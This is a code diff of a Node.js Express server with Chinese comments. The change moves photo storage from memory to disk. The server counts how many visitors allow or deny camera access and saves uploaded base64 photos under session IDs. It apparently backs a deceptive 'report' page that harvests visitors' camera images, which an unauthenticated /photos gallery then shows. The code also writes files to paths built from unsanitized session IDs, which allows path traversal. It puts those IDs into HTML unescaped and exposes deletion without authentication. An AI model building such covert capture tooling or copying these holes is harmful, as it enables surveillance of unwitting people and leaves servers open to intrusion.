@@ -1,22 +1,47 @@
 const express = require('express');
 const path = require('path');
+const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json({ limit: '20mb' }));
 app.use(express.static(__dirname));
 
-// 存储照片（内存，重启清空）
-const photoStore = {};
+// 持久化存储目录（Railway Volume 挂载到 /data）
+const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
+const PHOTOS_DIR = path.join(DATA_DIR, 'photos');
+const STATS_FILE = path.join(DATA_DIR, 'stats.json');
 
-// 点击允许计数
-const clickStats = { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
+// 确保目录存在
+[DATA_DIR, PHOTOS_DIR].forEach(dir => {
+  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+});
+
+// 提供照片文件的静态服务
+app.use('/data', express.static(DATA_DIR));
+
+// 读取/写入统计数据
+function loadStats() {
+  try {
+    if (fs.existsSync(STATS_FILE)) {
+      return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
+    }
+  } catch (e) {}
+  return { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
+}
+
+function saveStats(stats) {
+  fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
+}
+
+let clickStats = loadStats();
 
 // 记录点击
 app.post('/api/track/:type', (req, res) => {
   const type = req.params.type;
   if (type in clickStats) {
     clickStats[type]++;
+    saveStats(clickStats);
     res.json({ ok: true, count: clickStats[type] });
   } else {
     res.status(400).json({ ok: false });
@@ -25,10 +50,8 @@ app.post('/api/track/:type', (req, res) => {
 
 // 重置统计
 app.post('/api/track/reset', (req, res) => {
-  clickStats.notif = 0;
-  clickStats.camera = 0;
-  clickStats.realCameraAllow = 0;
-  clickStats.realCameraDeny = 0;
+  clickStats = { notif: 0, camera: 0, realCameraAllow: 0, realCameraDeny: 0 };
+  saveStats(clickStats);
   res.json({ ok: true });
 });
 
@@ -37,26 +60,68 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'report.html'));
 });
 
-// 上传照片
+// 获取所有session列表
+function getSessions() {
+  const sessionsFile = path.join(DATA_DIR, 'sessions.json');
+  try {
+    if (fs.existsSync(sessionsFile)) {
+      return JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
+    }
+  } catch (e) {}
+  return {};
+}
+
+function saveSessions(sessions) {
+  fs.writeFileSync(path.join(DATA_DIR, 'sessions.json'), JSON.stringify(sessions, null, 2));
+}
+
+// 上传照片（保存到磁盘）
 app.post('/api/upload', (req, res) => {
   const { sessionId, index, data } = req.body;
   if (!sessionId || index == null || !data) {
     return res.status(400).json({ ok: false });
   }
-  if (!photoStore[sessionId]) photoStore[sessionId] = [];
-  photoStore[sessionId][index] = data;
+
+  const sessionDir = path.join(PHOTOS_DIR, sessionId);
+  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
+
+  // 保存 base64 图片为文件
+  const base64Data = data.replace(/^data:image\/\w+;base64,/, '');
+  const filePath = path.join(sessionDir, `${index}.jpg`);
+  fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
+
+  // 更新 session 索引
+  const sessions = getSessions();
+  if (!sessions[sessionId]) sessions[sessionId] = { photos: [] };
+  sessions[sessionId].photos[index] = `${sessionId}/${index}.jpg`;
+  saveSessions(sessions);
+
   res.json({ ok: true });
 });
 
 // 清除所有照片
 app.delete('/api/photos', (req, res) => {
-  Object.keys(photoStore).forEach(k => delete photoStore[k]);
+  // 删除所有照片文件
+  if (fs.existsSync(PHOTOS_DIR)) {
+    fs.readdirSync(PHOTOS_DIR).forEach(dir => {
+      const dirPath = path.join(PHOTOS_DIR, dir);
+      if (fs.statSync(dirPath).isDirectory()) {
+        fs.readdirSync(dirPath).forEach(file => {
+          fs.unlinkSync(path.join(dirPath, file));
+        });
+        fs.rmdirSync(dirPath);
+      }
+    });
+  }
+  // 清空 session 索引
+  saveSessions({});
   res.json({ ok: true });
 });
 
 // 查看照片页面
 app.get('/photos', (req, res) => {
-  const ids = Object.keys(photoStore);
+  const sessions = getSessions();
+  const ids = Object.keys(sessions);
   const isEmpty = ids.length === 0;
 
   let html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
@@ -98,7 +163,7 @@ body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color
     html += '<div class="empty">暂无照片</div>';
   } else {
     ids.reverse().forEach(id => {
-      const photos = photoStore[id];
+      const photos = sessions[id].photos || [];
       const time = id.split('_')[0];
       const dateStr = new Date(parseInt(time)).toLocaleString('zh-CN');
       const count = photos.filter(Boolean).length;
@@ -109,10 +174,13 @@ body{font-family:-apple-system,"PingFang SC",sans-serif;background:#f5f5f5;color
   </div>
   <div class="photos">`;
       photos.forEach((p, i) => {
-        if (p) html += `<div class="photo-wrap" data-url="${p}" onclick="togglePhoto(this)">
-  <img src="${p}" alt="照片${i + 1}">
+        if (p) {
+          const imgUrl = '/data/photos/' + p;
+          html += `<div class="photo-wrap" data-url="${imgUrl}" onclick="togglePhoto(this)">
+  <img src="${imgUrl}" alt="照片${i + 1}">
   <div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
 </div>`;
+        }
       });
       html += `</div><div class="meta">Session: ${id}</div></div>`;
     });
@@ -167,10 +235,11 @@ function clearAll(){
 
 // 查看所有session的JSON数据（调试用）
 app.get('/api/photos', (req, res) => {
-  const ids = Object.keys(photoStore);
+  const sessions = getSessions();
+  const ids = Object.keys(sessions);
   res.json(ids.map(id => ({
     sessionId: id,
-    count: photoStore[id].filter(Boolean).length
+    count: (sessions[id].photos || []).filter(Boolean).length
   })));
 });
 
